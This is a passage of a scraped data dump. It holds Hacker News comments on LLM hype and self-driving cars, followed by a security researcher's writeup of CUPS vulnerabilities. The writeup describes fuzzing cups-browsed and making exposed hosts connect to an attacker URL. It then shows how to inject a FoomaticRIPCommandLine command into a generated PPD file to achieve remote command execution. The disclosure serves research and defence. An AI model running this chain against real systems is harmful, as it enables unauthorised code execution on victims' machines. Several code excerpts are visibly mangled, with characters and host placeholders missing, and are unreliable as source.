clearly ridiculous to 2020s readers: LISP is an excellent tool for symbolic manipulation and it has no intelligence whatsoever even compared to a jellyfish[1], since it cannot learn. GPTs are a bit more complicated: they do learn, and transformer ANNs seem meaningfully more intelligent than jellyfish or C. elegans, which apparently lack \"attention mechanisms\" and, like word2vec, cannot form bidirectional associations. Yet Claude-3.5 and GPT-4o are still unable to form plans, have no notions of causality, cannot form consistent world models[2] and plainly don't understand what numbers actually mean, despite their (misleading) successes in symbolic mathematics. Mice and pigeons do have these cognitive abilities, and I don't think it's because God seeded their brains with millions of synthetic math problems. It seems to me that transformer ANNs are, at any reasonable energy scale, much dumber than any bird or mammal, and maybe dumber than all vertebrates. There's a huge chunk we are missing. And I believe what fuels AI boom/bust cycles are claims that certain AI is almost as intelligent as a human and we just need a bit more compute and elbow grease to push us over the edge. If AI investors, researchers, and executives had a better grasp of reality - \"LISP is as intelligent as a sponge\", \"GPT is as intelligent as a web-spinning spider, but dumber than a jumping spider\" - then there would be no winter, just a realization that spring might take 100 years. Instead we see CS PhDs deluding themselves with Asimov fairy tales. [1] Jellyfish don't have brains but their nerve nets are capable of Pavlovian conditioning - i.e., learning. [2] I know about that Othello study. It is dishonest. Unlike those authors, when I say \"world model\" I mean \"world.\" reply wongarsu 4 hours agorootparentI guess it depends on what we mean by \"AI winter\". I completely agree that the current insane levels of investment aren't justified by the results, and when the market realises this it will overreact. But at the same time there is a lot of value to capture here by building solid applications around the capabilities that already exist. It might be a winter more like the \"winter\" image recognition went through before multimodal LLMs than the previous AI winter reply aithrowawaycomm 4 hours agorootparentI think the upcoming AI bust will be similar to the 2000s dotcom bust - ecommerce was not a bad idea or a scam! And neither are transformers. But there are cultural similarities: a) childish motivated reasoning led people to think a fairly simple technology could solve profoundly difficult business problems in the real world b) a culture of \"number goes up, that's just science\" c) uncritical tech journalists who weren't even corrupt, just bedazzled In particular I don't think generative AI is like cryptocurrency, which was always stupid in theory, and in practice it has become the rat's nest of gangsters and fraudsters which 2009-era theory predicted. After the dust settles people will still be using LLMs and art generators. reply namaria 3 hours agorootparentI see the same way. My current strategy is what I think I should have done in the dotcom bubble: carefully avoid pigeonholing myself in the hype topics while learning the basics so I can set up well positioned teams after the dust settles. reply apsec112 5 hours agorootparentprevWhat LLM abilities, if you saw them demonstrated, would cause you to change your mind? reply aithrowawaycomm 4 hours agorootparentLet's start with a multimodal[1] LLM that doesn't fail vacuously simple out-of-distribution counting problems. I need to be convinced that an LLM is smarter than a honeybee before I am willing to even consider that it might be as smart as a human child. Honeybees are smart enough to understand what numbers are. Transformer LLMs are not. In general GPT and Claude are both dramatically dumber than honeybees when it comes to deep and mysterious cognitive abilities like planning and quantitative reasoning, even if they are better than honeybees at human subject knowledge and symbolic mathematics. It is sensible to evaluate Claude compared to other human knowledge tools, like an encyclopedia or Mathematica, based on the LLM benchmarks or \"demonstrated LLM abilities.\" But those do not measure intelligence. To measure intelligence we need make the LLM as ignorant as possible so it relies on its own wits, like cognitive scientists do with bees and rats. (There is a general sickness in computer science where one poorly-reasoned thought experiment from Alan Turing somehow outweighs decades of real experiments from modern scientists.) [1] People dishonestly claim LLMs fail at counting because of minor tokenization issues, but a) they can count just fine if your prompt tells them how, so tokenization is obviously not a problem b) they are even worse at counting if you ask them to count things in images, so I think tokenization is irrelevant! reply sufjkw 3 hours agorootparentprev> I'm more productive than ever before. Who are you and what are you being so productive in? These code assistants are wholly unable to help with the day to day work I do. Sometimes I use them to remind me what flags to use with a tarball[0], so replaced SO, but anything of consequence or creativity and they flounder. What are you getting out of this excess productivity? A pay raise? More time with your loved ones? [0] https://xkcd.com/1168/ (addressing the tool tip, but hilariously, in regards the comics content that would be a circumstance where I would absolutely avoid trusting one of these ‘assistants’) reply inoop 6 hours agorootparentprev\"This is actually good for Bitcoin\" reply lynx23 6 hours agorootparentprevWhile I get where your fascinaton comes from... > I'm more productive than ever before. You realize that another way to read that sentence is \"I am a really bad coder\". reply JanSt 6 hours agorootparentMaybe I am, but I'm getting pretty rich doing it, so there is that. :) reply skwee357 5 hours agorootparentThe fact that you make money using AI, has nothing to do with its usefulness for society/humanity. There are people who are getting “pretty rich” by trafficking humans, or selling drugs. Would you want to live in a society where such activities are encouraged? In the end, we need to look at technological progress (or any progress for that matter) as where it will bring us to in the future, rather than what it allows you to do now. It also pisses me off that software engineering has such a bad reputation that everyone, from common folks to the CEO of nvidia, is shitting on it. You don’t hear phrases like “AI is going to change medicine/structural engineering”, because you would shit your pants if you had to sit in a dentist chair, while the dentist would ask ChatGPT how to perform a root canal; or if you had to live in a house designed by a structural engineer whose buddy was Claude. And yet, somehow, everyone is ready to throw software engineers under the bus and label them as \"useless\"/easily replaceable by AI. reply namaria 3 hours agorootparentprev\"I'm getting paid so I don't really care\" is the most destructive instance a human can take. Why do you think we're about to disrupt the Holocene climate optimum that gave birth to modern civilization? reply frankc 6 hours agorootparentprevI think this is what the kids call \"copium\". To be honest, when people think like this it makes me smile. I'd rather compete against people programming on punchcards. reply amelius 6 hours agoparentprev> The winter after this is gonna be harsh. The winter is going to be warm because of all the heat generated by GPUs ;) reply wongarsu 4 hours agorootparentIf this winter comes, the sudden availability of cheap used enterprise GPUs is going to be a major boon for hobbyist AI training. We will all have warm homes and sky high electricity bills reply yapyap 4 hours agorootparentprevas will the summer, spring and autumn. global warming is killing us all reply rubyfan 6 hours agoparentprevReminds me of autonomous vehicles a couple of years back. Or even AI a couple of years back, remember Watson? The hype cycle was faster to close that time. reply Jach 6 hours agorootparentIBM Watson was more than a couple years back. The Jeopardy event was in 2011. It's currently 2024. As for cars, I don't know what you're referring to specifically, and the hype is still ongoing as far as I can tell. It has taken 10+ years to get to present day, from the start of the \"deep learning revolution\" around 2010. I vaguely recall Uber promising self-driving pickups somewhere around 8-10 years ago. A main difference between current AI systems and the systems behind the cyclical hype cycles ongoing since the 1950s is that these systems are actually delivering impressive and useful results, increasingly so, to a much larger amount of people. Waymo alone services tens of thousands of autonomous rides per month (edit: see sibling comment, I was out of date, it's currently hundreds of thousands of rides per month -- but see, increasingly), and LLMs are waaaaay beyond the grandparent's flippant characterization of \"plausible-looking but incorrect sentences\". That's markov chains territory. reply aithrowawaycomm 5 hours agorootparent> Waymo alone services tens of thousands of autonomous rides per month (edit: see sibling comment, I was out of date, it's currently hundreds of thousands of rides per month -- but see, increasingly) But they aren't particularly autonomous, there's a fleet of humans watching the Waymos carefully and frequently intervening for the case where every 10-20 miles or so the system makes a stupid decision that needs human intervention: https://www.nytimes.com/interactive/2024/09/03/technology/zo... I think Waymo only releases the \"critical\" intervention rate, which is quite low. But for Cruise the non-critical interventions was every 5 miles and I suspect Waymos are similar. It appears that Waymos are way too easily confused and left to their own devices make awful decisions about passing emergency vehicles, etc. Which is in fact consistent with what self-driving skeptics were saying all the way back in 2010: deep learning could get you 95% of the way there but it will take many decades - probably centuries! - before we actually have real self-driving cars. The remote human operators will work for robotaxis and buses but not for Teslas. (Not to mention the problems that will start when robotaxis get old and in need of automotive maintenance, but the system didn't have any transmission problem scenarios in its training data. At no time in my life has my human intelligence been more taxed than when I had a tire blowout on the interstate while driving an overloaded truck.) reply Jach 4 hours agorootparentThe link you gave does not support your claims about Waymo, it's just speculation. What \"critical\" intervention rate are you talking about? What network magically supports the required low latencies to remotely respond to an imminent accident? How does your theory square with events like https://www.sfchronicle.com/sf/article/s-f-waymo-robotaxis-f... that required a service team to physically go and deal with the stuck cars, rather than just dealing with them via some giant remotely intervening team that's managed to scale to 10x rides in a year? (Hundreds of thousands per month absolutely.) Sure, there's no doubt a lot of human oversight going on still, probably \"remote interventions\" of all sorts (but not tele-operating) that include things like humans marking off areas of a map to avoid and pushing out the update for the fleet, the company is run by humans... But to say they aren't particularly autonomous is deeply wrong. I would be interested if you can dig up some old skeptics, plural, saying probably centuries. May take centuries, sure, I've seen such takes, they were usually backed by an assumption that getting all the way there requires full AGI and that'll take who knows how long. It's worth noticing that a lot of such tasks assumed to be \"AGI-complete\" have been falling lately. It's helpful to be focused on capabilities, not vague \"what even is intelligence\" philosophizing. Your parenthetical seems pretty irrelevant. First, models work outside their training sets. Second, these companies test such scenarios all the time. You'll even note in the link I shared that Waymo cars were at the time programmed to not enter the freeway without a human behind the wheel, because they were still doing testing. And it's not like \"live test on the freeway with a human backup\" is the first step in testing strategy, either. reply aithrowawaycomm 2 hours agorootparent> What \"critical\" intervention rate are you talking about? What network magically supports the required low latencies to remotely respond to an imminent accident? I was being vague - Waymo tests the autonomous algorithms with human drivers before they are deployed in remote-only mode. Those human drivers rarely but occasionally have to yank control from the vehicle. This is a critical intervention, and it seems like the rates are so low that riders almost never encounter a problem (though it does happen). Waymo releases this data, but doesn't release data on \"non-critical interventions\" where remote operators help with basic problem solving during normal operations. This is the distinction I was making and didn't phrase it very clearly. I think those people are intervening at least every 10-20 miles. And since those interventions always involve common-sense reasoning about some simple edge case, my claim is that the cars need that common-sense reasoning in order to get rid of the humans in the loop. I am not convinced that there's even enough drivers in the world to generate the data current AI needs to solve those edge cases - things like \"the fire department ordered brand new trucks and the system can't recognize them because the data literally doesn't exist.\" > First, models work outside their training sets. This is incredibly ignorant, pure \"number go up\" magical thinking. Models work for simple interpolations outside their training data, but a mechanical failure is not an interpolation, it's a radically different change which current systems must be specifically trained on. AI does not have the ability to causally extrapolate based on physical reasoning like humans. I had never experienced a tire blowout but I knew immediately what went wrong, relying on tactile sensations to determine something was wrong in the rear right + basic conceptual knowledge of what a car is to determine the tire must have exploded. Even deep learning's strongest (reality-based) advocates acknowledge this sort of thinking is far beyond current ANNs. Transformers would need to be trained on the scenario data. There are mitigations that might work: simply coming to a slow stop when a separate tire diagnostic redlines, etc. But these might prove bitter and unreliable. > Second, these companies test such scenarios all the time. No they don't! The only company I am aware of which has tested tire blowouts is Kodiak Robotics, and that seemed to be a slick product demo rather than a scientific demonstration. I am not aware of any public Waymo results. reply anon291 4 hours agorootparentprev> Which is in fact consistent with what self-driving skeptics were saying all the way back in 2010: deep learning could get you 95% of the way there but it will take many decades - probably centuries! - before we actually have real self-driving cars. The remote human operators will work for robotaxis and buses but not for Teslas. If this is the end result, this is already a substantial business savings. reply lupusreal 5 hours agorootparentprevCenturies seems like quite a stretch, we haven't even been doing this computer stuff for one century yet. reply aithrowawaycomm 4 hours agorootparentThe problem is not \"computers,\" it's intelligence itself. We still don't know how even the simplest neurons actually work, nor the simplest brains. And we're barely any closer to scientific definitions of \"intelligence,\" \"consciousness,\" etc than we were in the 1800s. There are many decades of experiments left to do, regardless of how fancy computers might be. I suspect it will take centuries before we make dog-level AI because it will take centuries to understand how dogs are able to reason. reply anon291 4 hours agorootparentprevYeah I have no idea what these people are talking about. The current gen of AI is qualitiatively different than previous attempts. For one, GPT et al are already useful without any kind of special prompting. I'd also like to challenge people to actually consider how often humans are correct. In my experience, it's actually very rare to find a human that speaks factually correctly. Many professionals, including doctors (!), will happily and confidently deliver factually incorrect lies that sound correct. Even after obvious correction they will continue to spout them. Think how long it takes to correct basic myths that have established themselves in the culture. And we expect these models, which are just getting off the ground, to do better? The claim is they process information more similarly to how humans do. If that's true, then the fact they hallucinate is honestly a point in their favor. Because... in my experience, they hallucinate exactly the way I expect humans to. Please try it, ask a few experts something and I guarantee you that further investigation into the topic will reveal that one or more of them are flat out incorrect. Humans often simply ignore this and go based on what we believe to be correct. A lot of people do it silently. Those who don't are often labeled know-it-alls. reply skydhash 4 hours agorootparentYon don't ask a neurosurgeon how to build an house, just like you don't ask a plane pilot how to drill a tunnel. Expertise is localized. And the most important thing is that humans learn. reply anon291 3 hours agorootparent> And the most important thing is that humans learn. Implementation detail that will be solved as the price of AI training decreases. Right now only inference is feasible at scale. Transformers are excellent here since they show great promise at 'one shot' learning meaning they can be 'trained' for the same cost as inference. Hence the sudden boom in AI . We finally have a taste of what could be should we be able to not only inference but also train models at scale. reply neevans 3 hours agorootparentprevHumans learn from seeing I don't think we are the stage of training models with videos / images dataset. We only reached the plateau with text dataset to train with. reply autoconfig 6 hours agorootparentprevWhen you do something that is extraordinarily hard, sometimes it takes longer than you expect. But now we're here: https://techcrunch.com/2024/08/20/waymo-is-now-giving-100000... reply bamboozled 5 hours agorootparentTo be fair, is waymo \"only\" AI? I'm guessing it's a composite of GPS (car on a rail), some high detailed mapping, and then yes, some \"AI\" involved in recognition and decision making of course but the car isn't an AGI so to speak? Like it wouldn't know how to change a tyre or fix the engine or drive some where the mapping data isn't yet available ? reply autoconfig 4 hours agorootparentWhere did I say that it's AGI? I was addressing the parent's comment: > \"Reminds me of autonomous vehicles a couple of years back\". I don't think any reasonable interpretation of \"autonomous vehicle\" includes the ability to change a tyre. My point is that sometimes hype becomes reality. It might just take a little longer than expected. reply bamboozled 4 hours agorootparentOk maybe I just never saw the hype, just another engineering and data challenge that was going to be solved one way or another. reply sixQuarks 6 hours agorootparentprevI see you haven’t tried the latest FSD build from Tesla. reply driverdan 4 hours agorootparentThe one that keeps making major, scary mistakes? reply slibhb 6 hours agoparentprev\"Plausible-looking but incorrect sentences\" is cheap, reflexive cynicism. LLMs are an incredible breakthrough by any reasonable standard. The reason to be optimistic about further progress is that we've seen a massive improvement in capabilities over the past few years and that seems highly likely to continue for the next few (at least). It's not going to scale forever, but it seems pretty clear that when the dust settles we'll have LLMs significantly more powerful than the current cutting edge -- which is already useful. Is it going to scale to \"superintelligence?\" Is it going to be \"the last invention?\" I doubt it, but it's going to be a big deal. At the very least, comparable to google search, which changed how people interact with computers/the internet. reply stackghost 6 hours agorootparent>when the dust settles we'll have LLMs significantly more powerful than the current cutting edge -- which is already useful. LLMs, irrespective of how powerful, are all subject to the fundamental limitation that they don't know anything. The stochastic parrot analogy remains applicable and will never be solved because of the underlying principles inherent to LLMs. LLMs are not the pathway to AGI. reply davidbalbert 5 hours agorootparentI sometimes wonder if we’re just very advanced stochastic parrots. Repeatedly, we’ve thought that humans and animals were different in kind, only to find that we’re actually just different in degree: elephants mourn their dead, dolphins have sex for pleasure, crows make tools (even tools out of multiple non-useful parts! [1]). That could be true here. LLMs are impressive. Nobody knows whether they will or won’t lead to AGI (if we could even agree on a definition – there’s a lot of No True Scotsman in that conversation). My uneducated guess is that that you’re probably right: just continuing to scale LLMs without other advancements won’t get us there. But I wish we were all more humble about this. There’s been a lot of interesting emergent behavior with these systems, and we just don’t know what will happen. [1]: https://www.ox.ac.uk/news/2018-10-24-new-caledonian-crows-ca... reply airstrike 4 hours agorootparentI swear I read this exact same thread in nearly every post about OpenAI on HN. It's getting to a point where it almost feels like it's all generated by LLMs reply stackghost 3 hours agorootparentYou mean the standard refrain of \"we too are stochastic parrots\"? Yes, that argument gets trotted out over and over. LLM proponents seem unwilling to accept that we comprehend the words we speak/write in a way that LLMs are not capable of doing. reply airstrike 3 hours agorootparentI was referring to the whole thread, so it includes the \"LLMs are nothing but stochastic parrots\" bit too. reply slibhb 6 hours agorootparentprevArguing over terminology like \"AGI\" and the verb \"to know\" is a waste of time. The question is what tools can be built from them and how can people use those tools. reply alickz 5 hours agorootparentAgreed. I thought a forum of engineers would be more interested in the practical applications and possible future capabilities of LLMs, than in all these semantic arguments about whether something really is knowledge or really is art or really is perfect reply stackghost 5 hours agorootparentprevI'm directly responding to a comment discussing the popular perception that we, as a society, are \"steps away\" from AGI. It sounds like you agree that we aren't anywhere close to AGI. If you want to discuss the potential for LLMs to disrupt the economy there's definitely space for that discussion but that isn't the comment I was making. reply circuit10 2 hours agorootparentWhether we should call what LLMs do “knowing” isn’t really relevant to how far away we are from AGI, what matters is what they can actually do, and they can clearly do at least some things that show what we would call knowledge if a human did it, so I think this is just humans wanting to feel we’re special reply stackghost 2 hours agorootparent>they can clearly do at least some things that show what we would call knowledge if a human did it Hard disagree. LLMs merely present the illusion of knowledge to the casual observer. A trivial cross examination usually is sufficient to pull back the curtain. reply ramraj07 6 hours agorootparentprevNoam Chomsky and Doug Hofstader had the same opinion. Last I checked Doug has recanted his skepticism and is seriously afraid for the future of humanity. I’ll listen to him and my own gut than some random internet people still insisting this is all a nothing burger. reply lucianbr 5 hours agorootparentThe thing is my gut is telling me this is a nothing burger, and I'll listen to my own gut before yours - a random internet person insisting this is going to change the world. So what exactly is the usefulness of this discussion? You think \"I'll trust my gut\" is a useful argument in a debate? reply lupusreal 5 hours agorootparentTrusting your gut isn't a useful debate tactic, but it is a useful tool for everybody to use personally. Different people will come to different conclusions, and that's fine. Finding a universal consensus about future predictions will never happen, it's an unrealistic goal. The point of the discussion isn't to create a consensus; it's useful because listening to people with other opinions can shed light on some blind spots all of us have, even if we're pretty sure the other guys are wrong about all or most of what they're saying. FWIW my gut happens to agree with yours. reply zmgsabst 5 hours agorootparentprevNetworks correspond to diagrams correspond to type theories — and LLMs learn such a theory and reason in that internal language (as in, topos theory). That effective theory is knowledge, literally. People harping about “stochastic parrot” are just people repeating a shallow meme — ironically, like a stochastic parrot. reply __alexs 6 hours agorootparentprev> \"Plaus",
    "originSummary": [
      "OpenAI CEO Sam Altman proposed a $7 trillion investment for 36 new chipmaking plants during his tour of the Far East, facing skepticism from TSMC executives.",
      "TSMC execs dismissed Altman’s ambitious plans as unrealistic, though companies like Microsoft, Nvidia, and Apple continue discussions with OpenAI.",
      "Altman envisions AI becoming as essential as electricity, despite current AI applications not yet proving their full value."
    ],
    "commentSummary": [
      "TSMC executives reportedly dismissed OpenAI CEO Sam Altman as a \"podcasting bro,\" highlighting a perceived disconnect between AI hype and the realities of chip manufacturing.",
      "The discussion underscores the complexities of chip production and energy requirements, areas where TSMC excels, contrasting with the optimistic projections of AI's potential.",
      "The debate reflects broader concerns about the economic viability and sustainable impact of AI technologies, with varying opinions on their long-term productivity gains."
    ],
    "points": 441,
    "commentCount": 472,
    "retryCount": 0,
    "time": 1727434886
  },
  {
    "id": 41662596,
    "title": "Attacking UNIX Systems via CUPS",
    "originLink": "https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/",
    "originBody": "ATTACKING UNIX SYSTEMS VIA CUPS, PART I 2024-09-26 cups, cups-browsed, disclosure, exploit, hacking, ipp, printer, printing, rce, responsible disclosure, udp, unix, zeroconf Hello friends, this is the first of two, possibly three (if and when I have time to finish the Windows research) writeups. We will start with targeting GNU/Linux systems with an RCE. As someone who’s directly involved in the CUPS project said: From a generic security point of view, a whole Linux system as it is nowadays is just an endless and hopeless mess of security holes waiting to be exploited. Well they’re not wrong! While this is not the first time I try to more or less responsibly report a vulnerability, it is definitely the weirdest and most frustrating time as some of you might have noticed from my socials, and it is also the last time. More on this later, but first. Summary CVE-2024-47176cups-browsed = end) return (TRUE); if (c) { // Extract location field { int i; c++; for (i = 0; i = end) return (TRUE); if (*c == '\\\"') for (c++; c = end) return (TRUE); // Is there an info field? if (*c == '\\\"') { int i; c++; for (i = 0; i = end) return (TRUE); So I quickly put together a fuzzing target around process_browse_data, start my good old friend AFL, and wait. You won’t believe what happens next!!! There are 5 different fuzzing inputs that trigger this: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 process_browse_data() in THREAD 136077340691200 got= 1135 httpAddrGetString(addr=0x7bc2f7f098a0, s=0x7bc2f7f09a00, slen=255) 1httpAddrGetString: returning \"UNKNOWN\"... browse packet received from UNKNOWN process_browse_data: location: |IIIIIIII???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????@???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????| ================================================================= ==28780==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7bc2f7f09820 at pc 0x58293fb0926b bp 0x7fffa0308490 sp 0x7fffa0308488 READ of size 1 at 0x7bc2f7f09820 thread T0 #0 0x58293fb0926a in process_browse_data(char const*) /home/evilsocket/lab/cups-fuzz/process_browse_data/main.cpp:264:42 #1 0x58293fb093d6 in main /home/evilsocket/lab/cups-fuzz/process_browse_data/main.cpp:292:9 #2 0x7bc2fa42a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16 #3 0x7bc2fa42a28a in __libc_start_main csu/../csu/libc-start.c:360:3 #4 0x58293fa293e4 in _start (/home/evilsocket/lab/cups-fuzz/process_browse_data/fuzz-target+0x2d3e4) (BuildId: a6df1903658bcb123c38a4a928f80e2a81b617e1) Address 0x7bc2f7f09820 is located in stack of thread T0 at offset 2080 in frame #0 0x58293fb08557 in process_browse_data(char const*) /home/evilsocket/lab/cups-fuzz/process_browse_data/main.cpp:164 This frame has 8 object(s): [32, 2080) 'packet' (line 165) 0x7bc2f7f09800: 00 00 00 00[f2]f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 0x7bc2f7f09880: f2 f2 f2 f2 00 00 00 00 00 00 00 00 00 00 00 00 0x7bc2f7f09900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x7bc2f7f09980: 00 00 00 00 f2 f2 f2 f2 f2 f2 f2 f2 04 f2 04 f2 0x7bc2f7f09a00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x7bc2f7f09a80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==28780==ABORTING I believe it being due to the pointer being dereferenced before the exit condition is verified, in both loops. I also found out later on that there’s a race condition and possibly DoS in the lock acquired here. Both these issues have been reported and thoroughly documented, to the devs and the CERT, but nobody seemed to give a damn. I can tell you that there’re other, more easily exploitable code paths going on, not just in the discovery mechanism - also reported and ignored. To this day they have not been acknowledged or patched. Happy hunting. However, I’m a bit lazy and most importantly I’m a noob when it comes to binary exploitation. Hell, I can barely tell whether a buffer overflow or a race condition are exploitable or not. Hardening mechanisms are getting more and more complex to bypass and to be honest I had no intention of spending months on this stuff - I hate printers. So for the moment I decided to move on to what seemed to be a lower hanging fruit. Back to found_cups_printer By looking at found_cups_printer we can see that one of the two text fields parsed from the packet is a URL: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // // A CUPS printer has been discovered via CUPS Browsing // or with BrowsePoll // static void found_cups_printer(const char *remote_host,const char *uri,const char *location,const char *info) { // ... initialization skipped ... httpSeparateURI(HTTP_URI_CODING_ALL, uri,scheme, sizeof(scheme) - 1,username, sizeof(username) - 1,host, sizeof(host) - 1,&port,resource, sizeof(resource)- 1); After some further validation and parsing, this URL and other data are then passed as arguments to the examine_discovered_printer_record function, which ultimately executes create_remote_printer_entry. The create_remote_printer_entry function will then call cfGetPrinterAttributes from libcupsfilters: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // For a remote CUPS printer our local queue will be raw or get a // PPD file from the remote CUPS server, so that the driver on the // remote CUPS server gets used. So we will not generate a PPD file // or interface script at this point. p->netprinter = 0; if (p->uri[0] != '\\0') { p->prattrs = cfGetPrinterAttributes(p->uri, NULL, 0, NULL, 0, 1); debug_log_out(cf_get_printer_attributes_log); if (p->prattrs == NULL) { debug_printf(\"get-printer-attributes IPP call failed on printer %s (%s).\", p->queue_name, p->uri); goto fail; } } To understand what this means, we’ll need to briefly mention what the IPP protocol is, but for now the key points are: A packet containing any URL, in the form of 0 3 http://:/printers/whatever, gets to UDP port 631 This triggers a sequence of events that result in cups-browsed connecting to that URL, a drive-by kind of thing. So I tell to myself: there’s no freaking way that if I send this packet to a public IP running CUPS (thank you shodan.io), that computer will connect back to the server I specified. No way. I hack some python code together, fire up a VPS and try anyway. HOLY SH!!!!! Not only it connected back immediately, but it also reported the exact kernel version and architecture in the User-Agent header! We’ll see later how this protocol also reports the requesting username (on the target) for some requests. Also this aspect, that to me matches pretty well with CWE-200, has been reported and just scoffed off as part of the mechanism. Alright … let’s not waste time on arguing whether or not this is a problem, let’s get to the juicy stuff. We know that this thing talks HTTP and POSTs some semi binary payload, what the hell is that? Internet Printing Protocol The Internet Printing Protocol, in short IPP, is a specialized communication protocol for communication between client devices (computers, mobile phones, tablets, etc.) and printers (or print servers). It allows clients to submit one or more print jobs to the network-attached printer or print server, and perform tasks such as querying the status of a printer, obtaining the status of print jobs, or cancelling individual print jobs. Essentially, the system now believes that we are a printer and it is sending us, encapsulated in HTTP, a Get-Printer-Attributes request in order to fetch printer attributes such as the model, vendor and several others. It makes sense, the system discovered a new printer and somehow it has to know what it is. Well … I went back to writing some code and, by using the ippserver python package I was now able to respond properly, with attributes I controlled, to the service request. My fake printer was immediately added to the local printers with no notification whatsoever to the user. AMAZING! 🎉🥳🎉 What can we do with this? At this point I enabled debug logs in the service so I could observe what was going on when my fake printer was being discovered and added, and noticed these lines: 1 2 3 4 5 6 7 8 9 10 11 ... Wed Sep 4 13:15:32 2024 127517144909504 Creating permanent CUPS queue God_192_168_50_19. Wed Sep 4 13:15:32 2024 127517144909504 Loading saved printer options for God_192_168_50_19 from /var/cache/cups-browsed/cups-browsed-options-God_192_168_50_19 Wed Sep 4 13:15:32 2024 127517144909504 Failed reading file /var/cache/cups-browsed/cups-browsed-options-God_192_168_50_19, probably no options recorded yet Wed Sep 4 13:15:32 2024 127517144909504 Print queue God_192_168_50_19 is for remote CUPS queue(s) and we get notifications from CUPS, using implicit class device URI implicitclass://God_192_168_50_19/ Wed Sep 4 13:15:32 2024 127517144909504 PPD generation successful: PDF PPD generated. Wed Sep 4 13:15:32 2024 127517144909504 Created temporary PPD file: /tmp/00f9466d902dc Wed Sep 4 13:15:32 2024 127517144909504 Using PPD /tmp/00f9466d902dc for queue God_192_168_50_19. Wed Sep 4 13:15:32 2024 127517144909504 Editing PPD file /tmp/00f9466d902dc for printer God_192_168_50_19, setting the option defaults of the previous cups-browsed session and doing client-side filtering of the job, saving the resulting PPD in /tmp/00f9466d9231e. Wed Sep 4 13:15:32 2024 127517144909504 Non-raw queue God_192_168_50_19 with PPD file: /tmp/00f9466d9231e ... Wait what?! It looks like the service fetches these attributes and then creates some sort of temporary file, a “PPD”, on which these attributes are possibly saved. If we search for the PPD generation successful string that appears in the logs, we find ourselves in the create_queue function, where we can see how the attributes are passed to the ppdCreatePPDFromIPP2 API in libppd: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 // If we do not want CUPS-generated PPDs or we cannot obtain a // CUPS-generated PPD, for example if CUPS does not create a // temporary queue for this printer, we generate a PPD by // ourselves printer_ipp_response = (num_cluster_printers == 1) ? p->prattrs : printer_attributes; if (!ppdCreatePPDFromIPP2(ppdname, sizeof(ppdname), printer_ipp_response, make_model, pdl, color, duplex, conflicts, sizes, default_pagesize, default_color, ppdgenerator_msg, sizeof(ppdgenerator_msg))) { if (errno != 0) debug_printf(\"Unable to create PPD file: %s\", strerror(errno)); else debug_printf(\"Unable to create PPD file: %s\", ppdgenerator_msg); p->status = STATUS_DISAPPEARED; current_time = time(NULL); p->timeout = current_time + TIMEOUT_IMMEDIATELY; goto end; } else { debug_printf(\"PPD generation successful: %s\", ppdgenerator_msg); debug_printf(\"Created temporary PPD file: %s\", ppdname); ppdfile = strdup(ppdname); } We finally get to libppd, where the ppdCreatePPDFromIPP2 API is used to save some of those attacker controlled text attributes to a file with a very specific, line oriented syntax, without any sanitization whatsoever: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 if ((attr = ippFindAttribute(supported, \"printer-make-and-model\", IPP_TAG_TEXT)) != NULL) strlcpy(make, ippGetString(attr, 0, NULL), sizeof(make)); else if (make_model && make_model[0] != '\\0') strlcpy(make, make_model, sizeof(make)); else strlcpy(make, \"Unknown Printer\", sizeof(make)); if (!strncasecmp(make, \"Hewlett Packard \", 16) || !strncasecmp(make, \"Hewlett-Packard \", 16)) { model = make + 16; strlcpy(make, \"HP\", sizeof(make)); } else if ((model = strchr(make, ' ')) != NULL) *model++ = '\\0'; else model = make; cupsFilePrintf(fp, \"*Manufacturer: \\\"%s\\\"\", make); ///tmp/PWNED\" *cupsFilter2 : \"application/pdf application/vnd.cups-postscript 0 foomatic-rip You can see how we’re returning a printer-privacy-policy-uri attribute string (it can be any of the many attributes saved to the PPD) that will: Set printer-privacy-policy-uri to \"https://www.google.com/\", close the PPD string with the double quote, and add a new line. Inject the *FoomaticRIPCommandLine: \"echo 1 > /tmp/PWNED\" line with our command in the PPD. Inject the *cupsFilter2 : \"application/pdf application/vnd.cups-postscript 0 foomatic-rip line (notice the spaces before and after the colon and no closing double quotes) directive to instruct CUPS to execute /usr/lib/cups/filter/foomatic-rip (with our FoomaticRIPCommandLine) when a print job is sent. In this video you can see me on my attacker machine (on the left) using the first version of this exploit to attack my new laptop, a fully patched Ubuntu 24.04.1 LTS running cups-browsed 2.0.1, and (finally!!!) achieving command execution: Personal Considerations You will maybe be thinking now “wow, that’s a lot of stuff to read, code, RFCs, PDFs of forgotten standards, this research must have been so tiring”, but in reality this was a weekend worth of rabbit holes, this was the fun part. The actual work, the heavy, boring stuff started when on September 5, after confirming my findings, I decided to open a security advisory on the 